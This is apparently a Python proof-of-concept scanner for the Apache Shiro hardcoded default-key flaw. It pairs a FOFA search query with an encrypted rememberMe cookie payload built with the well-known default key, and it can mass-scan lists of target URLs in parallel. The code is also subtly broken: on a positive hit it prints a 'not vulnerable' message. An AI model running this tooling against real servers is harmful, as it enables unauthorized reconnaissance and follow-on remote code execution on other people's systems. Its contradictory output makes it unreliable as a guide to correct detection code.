#FOFA: app="Apache-Shiro"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def check_shiro(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
    }
    cookies = {'rememberMe': "123"}
    try:
        res = requests.get(url, verify=False, headers=headers, cookies=cookies, timeout=3)
        if 'rememberMe=deleteMe' in str(res.headers):
            return True
        else:
            return False
    except:
        return False

def poc(target):
    result = {
        'name': 'Shiro 默认密钥',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
    }
    payload_dict = {
        "kPH+bIxk5D2deZiIxcaaaA==": "3vakOJDcITulYawMdd4UijbPyPpv8wZkOZ7Yt0wBjT4GCmUbx1yXymqb1BLnkvBmJlQ/AWSKtysv9yV4IwHA2sr41OgrkhFABXpf3OJd8xei5RUuTMJVEVklCQuZD/diciR0hSKqwlw0vJ40XU41Osv2wsVVIurD7FoGziYufa74Jbo1VW7oWtWVNyaRLVyA",
    }
    if check_shiro(target):
        for key in payload_dict.keys():
            payload = payload_dict[key]
            cookies = {'rememberMe': payload}
            try:
                r = requests.get(target, headers=headers, cookies=cookies, timeout=3, verify=False, stream=True,allow_redirects=False)
                if 'rememberMe=deleteMe' not in str(r.headers):
                    result['vulnerable'] = True
                    result['url'] = target
                    result['key'] = key
                    print(f"{target}不存在漏洞")
            except:
                continue
        print (result)
    else:
        print (f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("Shiro 默认密钥漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()